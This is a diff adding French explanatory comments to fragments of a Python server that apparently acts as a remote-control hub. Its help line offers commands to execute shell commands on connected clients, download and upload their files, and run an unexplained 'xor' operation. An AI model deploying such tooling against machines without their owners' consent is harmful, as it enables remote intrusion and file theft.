@@ -7,6 +7,7 @@ import sys
 BUF_SIZE = 4096
 
 
+# Envoi d'une ligne texte au client
 def send_line(sock, text):
     try:
         sock.sendall((text + "\n").encode())
@@ -14,6 +15,7 @@ def send_line(sock, text):
         pass
 
 
+# Validation du HELLO recu (id + cle)
 def accept_hello(line):
     parts = line.strip().split(" ", 2)
     if len(parts) == 3 and parts[0] == "HELLO":
@@ -21,6 +23,7 @@ def accept_hello(line):
     return None, None
 
 
+# Sauvegarde d'un fichier envoye en base64 par le client
 def save_file(client_id, path, b64_data):
     try:
         data = base64.b64decode(b64_data)
@@ -35,6 +38,7 @@ def save_file(client_id, path, b64_data):
         print(f"[!] Erreur sauvegarde {path}: {exc}")
 
 
+# Lecture d'un fichier local, encodage base64 puis envoi
 def push_file(sock, local_path, remote_path):
     try:
         with open(local_path, "rb") as f:
@@ -58,6 +62,8 @@ def main(host="0.0.0.0", port=5000):
     client_by_sock = {}
     sock_by_id = {}
 
+    # Boucle principale: select attend les sockets prêtes (clients + clavier)
+    # On gere tous les clients en meme temps
     while True:
         readable, _, _ = select.select(sockets, [], [])
         for ready in readable:
@@ -121,6 +127,7 @@ def main(host="0.0.0.0", port=5000):
                     continue
                 print("Commandes: list | xor <id> | exec <id> <cmd> | get <id> <path> | put <id> <local> <dist>")
             else:
+                # recv peut planter si le client coupe brutalement
                 try:
                     data = ready.recv(BUF_SIZE)
                 except OSError:
